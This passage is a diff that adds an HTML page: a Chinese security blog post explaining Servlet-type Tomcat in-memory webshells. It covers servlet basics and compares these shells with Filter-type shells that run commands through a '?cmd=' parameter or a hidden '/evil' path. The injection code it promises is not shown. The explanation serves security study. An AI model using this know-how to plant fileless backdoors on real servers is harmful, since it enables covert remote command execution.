@@ -1,0 +1,1240 @@
+<!--
+  ╔══════════════════════════════════════════════════════════════╗
+  ║                                                              ║
+  ║   🎮 CTF Easter Egg Challenge!                               ║
+  ║                                                              ║
+  ║   Congratulations! You found the hidden comment!             ║
+  ║                                                              ║
+  ║   Here's your clue: The flag is the site owner's name        ║
+  ║   in lowercase letters.                                      ║
+  ║                                                              ║
+  ║   Open browser console and type:                             ║
+  ║   secret.flag("your_answer")                                 ║
+  ║                                                              ║
+  ║   Or try: secret.hint() for more clues                       ║
+  ║                                                              ║
+  ╚══════════════════════════════════════════════════════════════╝
+-->
+
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark">
+
+<head>
+  <meta charset="utf-8">
+  <style id="waifu-preload">#waifu{opacity:0;background:transparent;}#waifu canvas,#waifu #live2d,#waifu-toolbar{background:transparent;}</style>
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1" theme-name="Stellar" theme-version="1.33.1">
+  <link rel="manifest" href="/manifest.json">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="apple-mobile-web-app-title" content="Blog">
+  
+  
+  <meta name="generator" content="Hexo 7.3.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="theme-color" content="#f9fafb">
+  <title>代码审计 | Servlet —— Tomcat 内存马 - blog</title>
+
+  
+    <meta name="description" content="代码审计 | Servlet —— Tomcat 内存马 系列：Tomcat 内存马 —— 继 Filter 型之后，聊聊 Servlet 型的动态注入。   目录 一、Servlet 是如何注册和工作的 二、Filter 和 Servlet 的区别 三、回顾对比：Filter 型 vs Servlet 型 四、前置知识：Servlet 动态注册 API 五、直接调用 addServlet 的问题">
+<meta property="og:type" content="article">
+<meta property="og:title" content="代码审计 | Servlet —— Tomcat 内存马">
+<meta property="og:url" content="https://wr0ld.github.io/posts/eb030935/">
+<meta property="og:site_name" content="blog">
+<meta property="og:description" content="代码审计 | Servlet —— Tomcat 内存马 系列：Tomcat 内存马 —— 继 Filter 型之后，聊聊 Servlet 型的动态注入。   目录 一、Servlet 是如何注册和工作的 二、Filter 和 Servlet 的区别 三、回顾对比：Filter 型 vs Servlet 型 四、前置知识：Servlet 动态注册 API 五、直接调用 addServlet 的问题">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wr0ld.github.io/avatar.png">
+<meta property="article:published_time" content="2026-04-09T04:00:00.000Z">
+<meta property="article:modified_time" content="2026-04-09T13:07:29.443Z">
+<meta property="article:author" content="wr0ld">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="Tomcat">
+<meta property="article:tag" content="内存马">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="Servlet">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://wr0ld.github.io/avatar.png">
+  
+  
+  
+  <meta name="keywords" content="代码审计,Java,Tomcat,内存马,RCE,Servlet">
+
+  <!-- feed -->
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.0.0">
+
+
+  
+    <link rel="shortcut icon" href="/avatar.png">
+  
+
+  
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"wr0ld","sameAs":[],"image":"/avatar.png"},"dateCreated":"2026-04-09T12:00:00+08:00","dateModified":"2026-04-09T21:07:29+08:00","datePublished":"2026-04-09T12:00:00+08:00","description":"","headline":"代码审计 | Servlet —— Tomcat 内存马","mainEntityOfPage":{"@type":"WebPage","@id":"https://wr0ld.github.io/posts/eb030935/"},"publisher":{"@type":"Organization","name":"wr0ld","sameAs":[],"image":"/avatar.png","logo":{"@type":"ImageObject","url":"/avatar.png"}},"url":"https://wr0ld.github.io/posts/eb030935/","keywords":"代码审计, Java, Tomcat, 内存马, RCE, Servlet","thumbnailUrl":"https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/4d438cbe94b6b665403e80f0294dcfba.jpg","image":1}</script>
+  
+</head>
+<body>
+
+<div class="l_body content" id="start" layout="post" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/avatar.png" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">blog</div></a></div></header>
+
+<div class="nav-area">
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="实验室" href="/lab/" style="color:#F39C12"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M3.464 3.464C2 4.93 2 7.286 2 12s0 7.071 1.464 8.535C4.93 22 7.286 22 12 22s7.071 0 8.535-1.465C22 19.072 22 16.714 22 12s0-7.071-1.465-8.536C19.072 2 16.714 2 12 2S4.929 2 3.464 3.464" opacity=".5"/><path fill="currentColor" fill-rule="evenodd" d="M7.47 8.47a.75.75 0 0 1 1.06 0l2 2a.75.75 0 0 1 0 1.06l-2 2a.75.75 0 1 1-1.06-1.06L8.94 11L7.47 9.53a.75.75 0 0 1 0-1.06M12 14.25a.75.75 0 0 0 0 1.5h4a.75.75 0 0 0 0-1.5z" clip-rule="evenodd"/></svg></a><a class="nav-item" title="游戏" href="/games/" style="color:#FF6B6B"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M2 9.5c0-2.496 0-3.744.494-4.696a4.5 4.5 0 0 1 1.81-1.81C5.256 2.5 6.504 2.5 9 2.5h6c2.496 0 3.744 0 4.696.494a4.5 4.5 0 0 1 1.81 1.81C22 5.756 22 7.004 22 9.5v5c0 2.496 0 3.744-.494 4.696a4.5 4.5 0 0 1-1.81 1.81C18.744 21.5 17.496 21.5 15 21.5H9c-2.496 0-3.744 0-4.696-.494a4.5 4.5 0 0 1-1.81-1.81C2 18.244 2 16.996 2 14.5z" opacity=".5"/><path fill="currentColor" fill-rule="evenodd" d="M6.25 12a.75.75 0 0 1 .75-.75h2.25V9a.75.75 0 0 1 1.5 0v2.25H13a.75.75 0 0 1 0 1.5h-2.25V15a.75.75 0 0 1-1.5 0v-2.25H7a.75.75 0 0 1-.75-.75m9.5-1a1 1 0 1 0 0 2a1 1 0 0 0 0-2m2 3a1 1 0 1 0 2 0a1 1 0 0 0-2 0" clip-rule="evenodd"/></svg></a><a class="nav-item" title="卡牌" href="javascript:if(window.CardSystem)window.CardSystem.showPanel()" style="color:#E91E63"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M3.464 3.464C2 4.93 2 7.286 2 12s0 7.071 1.464 8.535C4.93 22 7.286 22 12 22s7.071 0 8.535-1.465C22 19.072 22 16.714 22 12s0-7.071-1.465-8.536C19.072 2 16.714 2 12 2S4.929 2 3.464 3.464" opacity=".5"/><path fill="currentColor" fill-rule="evenodd" d="M7.5 6.75a.75.75 0 0 0-.75.75v1.5c0 .414.336.75.75.75h9a.75.75 0 0 0 .75-.75v-1.5a.75.75 0 0 0-.75-.75zm-.75 5.25a.75.75 0 0 1 .75-.75h4.5a.75.75 0 0 1 0 1.5H7.5a.75.75 0 0 1-.75-.75m.75 2.25a.75.75 0 0 0 0 1.5h3a.75.75 0 0 0 0-1.5z" clip-rule="evenodd"/></svg></a><a class="nav-item" title="设置" href="/settings/" style="color:#9B59B6"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M12 2c-1.5 0-2.5 1.5-2.5 3v.5c0 .5-.5 1-1 1H7c-1.5 0-2.5 1-3 2.5l-.5 2c-.5 1.5.5 3 2 3.5l.5.2c.5.2 1 .7 1 1.3v.5c0 .5-.5 1-1 1.3l-.5.2c-1.5.5-2.5 2-2 3.5l.5 2c.5 1.5 1.5 2.5 3 2.5h1.5c.5 0 1-.5 1-1V20c0-.5.5-1 1-1h2c.5 0 1 .5 1 1v.5c0 .5.5 1 1 1H17c1.5 0 2.5-1 3-2.5l.5-2c.5-1.5-.5-3-2-3.5l-.5-.2c-.5-.2-1-.7-1-1.3v-.5c0-.5.5-1 1-1.3l.5-.2c1.5-.5 2.5-2 2-3.5l-.5-2c-.5-1.5-1.5-2.5-3-2.5h-1.5c-.5 0-1 .5-1 1V6c0 .5-.5 1-1 1h-2c-.5 0-1-.5-1-1v-.5c0-.5-.5-1-1-1" opacity=".5"/><path fill="currentColor" d="M12 15a3 3 0 1 0 0-6a3 3 0 0 0 0 6" clip-rule="evenodd"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4s-4 1.79-4 4s1.79 4 4 4" opacity=".5"/><path fill="currentColor" fill-rule="evenodd" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10s10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5l1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" clip-rule="evenodd"/></svg></a></nav>
+</div>
+<div class="widgets">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+<widget class="widget-wrapper todo-widget collapsible-widget"><div class="widget-header dis-select"><span class="name">任务简报 <span class="todo-count">(12)</span></span><span class="collapse-toggle"><i class="fas fa-chevron-down"></i></span></div><div class="widget-body fs14"><div class="todo-list"><div class="todo-item doing"><span class="todo-content">内存马Listener Valve</span></div><div class="todo-item doing"><span class="todo-content">log4j 内存马</span></div><div class="todo-item doing"><span class="todo-content">EDUSRC实战漏洞挖掘复盘脱敏</span></div><div class="todo-item doing"><span class="todo-content">小迪vpc1-5 Windows系统web内网横向域内</span></div><div class="todo-item doing"><span class="todo-content">rootkit 的 shellcode 嵌入</span></div><div class="todo-item doing"><span class="todo-content">fastjson 1.2.68 → 1.2.80</span></div><div class="todo-item doing"><span class="todo-content">java cc4 5 7</span></div><div class="todo-item doing"><span class="todo-content">Shiro 721</span></div><div class="todo-item doing"><span class="todo-content">信息收集方法论</span></div><div class="todo-item doing"><span class="todo-content">PHP反序列化 + Pop Chain构造</span></div><div class="todo-item doing"><span class="todo-content">云上服务</span></div><div class="todo-item doing"><span class="todo-content">docker容器逃逸</span></div></div></div></widget>
+</div>
+
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a> <span class="sep"></span> <a class="cap breadcrumb-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%86%85%E5%AD%98%E9%A9%AC/">内存马</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2026-04-09T04:00:00.000Z">2026-04-09</time></span><span class="sep"></span><span class="text word-count">字数：11056</span><span class="sep"></span><span class="text img-count">图片：10</span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>代码审计 | Servlet —— Tomcat 内存马</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><h1 id="代码审计-Servlet-——-Tomcat-内存马"><a href="#代码审计-Servlet-——-Tomcat-内存马" class="headerlink" title="代码审计 | Servlet —— Tomcat 内存马"></a>代码审计 | Servlet —— Tomcat 内存马</h1><blockquote>
+<p>系列：Tomcat 内存马 —— 继 Filter 型之后，聊聊 Servlet 型的动态注入。</p>
+</blockquote>
+<hr>
+<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
+<li><a href="#%E4%B8%80servlet-%E6%98%AF%E5%A6%82%E4%BD%95%E6%B3%A8%E5%86%8C%E5%92%8C%E5%B7%A5%E4%BD%9C%E7%9A%84">一、Servlet 是如何注册和工作的</a></li>
+<li><a href="#%E4%BA%8Cfilter-%E5%92%8C-servlet-%E7%9A%84%E5%8C%BA%E5%88%AB">二、Filter 和 Servlet 的区别</a></li>
+<li><a href="#%E4%B8%89%E5%9B%9E%E9%A1%BE%E5%AF%B9%E6%AF%94filter-%E5%9E%8B-vs-servlet-%E5%9E%8B">三、回顾对比：Filter 型 vs Servlet 型</a></li>
+<li><a href="#%E5%9B%9B%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86servlet-%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C-api">四、前置知识：Servlet 动态注册 API</a></li>
+<li><a href="#%E4%BA%94%E7%9B%B4%E6%8E%A5%E8%B0%83%E7%94%A8-addservlet-%E7%9A%84%E9%97%AE%E9%A2%98">五、直接调用 addServlet 的问题</a></li>
+<li><a href="#%E5%85%ADservlet-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81%E5%8F%8D%E5%B0%84%E7%BB%95%E8%BF%87">六、Servlet 型内存马注入代码（反射绕过）</a></li>
+<li><a href="#%E4%B8%83%E9%AA%8C%E8%AF%81%E6%AD%A5%E9%AA%A4">七、验证步骤</a></li>
+<li><a href="#%E5%85%AB%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9">八、注意事项</a></li>
+<li><a href="#%E4%B9%9D%E6%80%BB%E7%BB%93">九、总结</a></li>
+</ul>
+<hr>
+<h2 id="一、Servlet-是如何注册和工作的"><a href="#一、Servlet-是如何注册和工作的" class="headerlink" title="一、Servlet 是如何注册和工作的"></a>一、Servlet 是如何注册和工作的</h2><p>先来看一个最基础的 Servlet 示例，路径：<code>src/main/java/org/example/filter/EchoServlet.java</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.filter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">//@WebServlet(value = &quot;/echo&quot;, loadOnStartup = 1)</span></span><br><span class="line"><span class="meta">@WebServlet(&quot;/echo&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EchoServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;EchoServlet 初始化&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span></span><br><span class="line">            <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;msg&quot;</span>);</span><br><span class="line">        resp.setContentType(<span class="string">&quot;text/plain;charset=UTF-8&quot;</span>);</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;你输入的是：&quot;</span> + msg);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;EchoServlet 销毁&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="关于-loadOnStartup（懒加载）"><a href="#关于-loadOnStartup（懒加载）" class="headerlink" title="关于 loadOnStartup（懒加载）"></a>关于 loadOnStartup（懒加载）</h3><p><code>@WebServlet(value = &quot;/echo&quot;, loadOnStartup = 1)</code> 里面有个懒加载的知识点：</p>
+<ul>
+<li><code>loadOnStartup</code> 默认是 <code>-1</code>，启用懒加载模式</li>
+<li>规定 <code>loadOnStartup &gt;= 0</code> 时，Tomcat 启动时就会加载这个 Servlet</li>
+<li>懒加载模式下，只有第一次请求触发时才会初始化 <code>init()</code></li>
+<li>关闭懒加载后效果和 Filter 一样，<strong>启动服务时就初始化</strong></li>
+</ul>
+<blockquote>
+<p><strong>注意</strong>：动态注册的 Servlet 默认也是懒加载（首次访问时才调用 <code>init()</code>），但在内存马场景中，我们通常会在注入后立即主动访问一次后门路径来激活它，因此懒加载并不影响使用。</p>
+</blockquote>
+<p>启动服务后可以看到初始化的打印：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Servlet_image1.png"></p>
+<p>访问 <code>http://localhost:8080/echo?msg=你好</code>：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Servlet_image2.png"></p>
+<p>关闭时触发销毁：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Servlet_image3.png"></p>
+<hr>
+<h2 id="二、Filter-和-Servlet-的区别"><a href="#二、Filter-和-Servlet-的区别" class="headerlink" title="二、Filter 和 Servlet 的区别"></a>二、Filter 和 Servlet 的区别</h2><p>Filter 和 Servlet 最大的区别在于：</p>
+<ul>
+<li>**Filter 是”中间拦截器”**，负责预处理和后处理，通过 <code>chain.doFilter()</code> 继续传递请求，请求最终要到达 Servlet</li>
+<li>**Servlet 是”终点处理器”**，负责生成最终的响应内容</li>
+</ul>
+<p>设置 <code>@WebServlet(&quot;/echo&quot;)</code> 后，访问 <code>/echo</code> 就会由这个 Servlet 处理。</p>
+<p>如果设置 <code>@WebServlet(&quot;/*&quot;)</code>，那么不管访问 <code>/xxxx</code> 什么路径都会由这个 Servlet 处理。比如访问 <code>http://localhost:8080/asdasd?msg=aaa</code>：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/Servlet_image4.png"></p>
+<p><strong>依然可以正确显示内容，并没有 404，因为符合通配符规则。</strong></p>
+<p>Servlet 的 <code>doGet</code> 方法里没有类似 <code>chain.doFilter()</code> 的结尾，因为 <strong>Servlet 就是整条链的终点</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">请求 → Filter1.doFilter() → Filter2.doFilter() → Servlet.doGet() → 响应</span><br><span class="line">       ↓ 可截断 return       ↓ 可截断 return       直接输出，无后续</span><br></pre></td></tr></table></figure>
+
+<h3 id="Filter-和-Servlet-在-Java-继承结构上的区别"><a href="#Filter-和-Servlet-在-Java-继承结构上的区别" class="headerlink" title="Filter 和 Servlet 在 Java 继承结构上的区别"></a>Filter 和 Servlet 在 Java 继承结构上的区别</h3><ul>
+<li><code>Filter</code> 实现的是 <code>javax.servlet.Filter</code> <strong>接口</strong></li>
+<li><code>Servlet</code> 继承的是 <code>javax.servlet.http.HttpServlet</code> <strong>抽象类</strong>，而 <code>HttpServlet</code> 又实现了 <code>javax.servlet.Servlet</code> 接口</li>
+</ul>
+<blockquote>
+<p>抽象类是 Java 中的一种特殊类，它不能被直接实例化（不能 new），必须被继承后才能使用。<strong>一句话总结</strong>：抽象类就是”不能直接用的模板类”，必须通过继承来补全它缺失的部分。</p>
+</blockquote>
+<h3 id="处理方法对比"><a href="#处理方法对比" class="headerlink" title="处理方法对比"></a>处理方法对比</h3><table>
+<thead>
+<tr>
+<th align="left">对比项</th>
+<th align="left">Filter</th>
+<th align="left">Servlet</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>处理方法数量</strong></td>
+<td align="left">1 个：<code>doFilter()</code></td>
+<td align="left">多个：<code>doGet()</code>、<code>doPost()</code>、<code>doPut()</code> 等</td>
+</tr>
+<tr>
+<td align="left"><strong>是否区分 HTTP 方法</strong></td>
+<td align="left">不区分（需手动判断）</td>
+<td align="left">自动区分，容器帮调度</td>
+</tr>
+<tr>
+<td align="left"><strong>内存马适配</strong></td>
+<td align="left">无需关心方法</td>
+<td align="left">通常同时覆盖 GET 和 POST</td>
+</tr>
+</tbody></table>
+<h3 id="职责对比"><a href="#职责对比" class="headerlink" title="职责对比"></a>职责对比</h3><table>
+<thead>
+<tr>
+<th align="left">对比维度</th>
+<th align="left">Filter</th>
+<th align="left">Servlet</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>职责</strong></td>
+<td align="left">对请求&#x2F;响应进行<strong>预处理或后处理</strong></td>
+<td align="left">负责<strong>生成响应内容</strong>（业务逻辑）</td>
+</tr>
+<tr>
+<td align="left"><strong>链式调用</strong></td>
+<td align="left">多个 Filter 可形成过滤链，通过 <code>chain.doFilter()</code> 传递</td>
+<td align="left">单个 Servlet 处理一个请求，不存在链</td>
+</tr>
+<tr>
+<td align="left"><strong>拦截范围</strong></td>
+<td align="left">可匹配多个 URL 模式（<code>/*</code>、<code>/admin/*</code>、<code>*.jsp</code>）</td>
+<td align="left">通常映射到具体的路径（<code>/echo</code>）</td>
+</tr>
+<tr>
+<td align="left"><strong>是否必须放行</strong></td>
+<td align="left">必须调用 <code>chain.doFilter()</code> 才能继续</td>
+<td align="left">处理完毕后直接写回响应，流程结束</td>
+</tr>
+</tbody></table>
+<h3 id="静态-web-xml-写法"><a href="#静态-web-xml-写法" class="headerlink" title="静态 web.xml 写法"></a>静态 web.xml 写法</h3><p>在 <code>src/main/webapp/WEB-INF/web.xml</code> 中，于 <code>&lt;web-app&gt;</code> 标签内添加以下配置：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 声明 Servlet：给 Servlet 起个内部名字，并指定它对应的 Java 类 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>echoServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.example.servlet.EchoServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 映射 Servlet：告诉 Tomcat 这个 Servlet 要处理哪些 URL --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>echoServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/echo<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>写法和 Filter 的差不多，声明 + 映射两段配置。</p>
+<hr>
+<h2 id="三、回顾对比：Filter-型-vs-Servlet-型"><a href="#三、回顾对比：Filter-型-vs-Servlet-型" class="headerlink" title="三、回顾对比：Filter 型 vs Servlet 型"></a>三、回顾对比：Filter 型 vs Servlet 型</h2><p>在上一篇中，通过反射操作 <code>StandardContext</code>，动态注入了一个恶意的 Filter，实现了无文件落地的后门。Filter 型内存马通过拦截所有 URL（<code>/*</code>）并检测特定参数来触发命令执行。</p>
+<p>本篇介绍另一种同样常用的内存马形态：<strong>Servlet 型</strong>。它的核心思路是：<strong>动态创建一个恶意的 Servlet，并为其映射一个外部可访问的 URL 路径</strong>。由于 Servlet 是专门处理 HTTP 请求的组件，因此这种内存马更像是一个”隐藏的 API 接口”。</p>
+<table>
+<thead>
+<tr>
+<th align="left">对比项</th>
+<th align="left">Filter 型</th>
+<th align="left">Servlet 型</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>注入位置</strong></td>
+<td align="left">往 <code>filterDefs</code>、<code>filterMaps</code>、<code>filterConfigs</code> 塞数据</td>
+<td align="left">往 <code>StandardContext</code> 的 <code>children</code>（Wrapper）中添加</td>
+</tr>
+<tr>
+<td align="left"><strong>触发方式</strong></td>
+<td align="left">任何匹配 <code>/*</code> 的请求，带 <code>?cmd=</code> 参数时触发</td>
+<td align="left">访问固定的映射路径（如 <code>/evil</code>），可带参数也可不带</td>
+</tr>
+<tr>
+<td align="left"><strong>隐蔽性</strong></td>
+<td align="left">较高，与正常业务混合</td>
+<td align="left">较低，独立路径容易被扫描发现</td>
+</tr>
+<tr>
+<td align="left"><strong>实现难度</strong></td>
+<td align="left">需要反射操作三个集合（filterDefs、filterMaps、filterConfigs）</td>
+<td align="left">可以直接使用标准 API，几乎无需反射</td>
+</tr>
+</tbody></table>
+<hr>
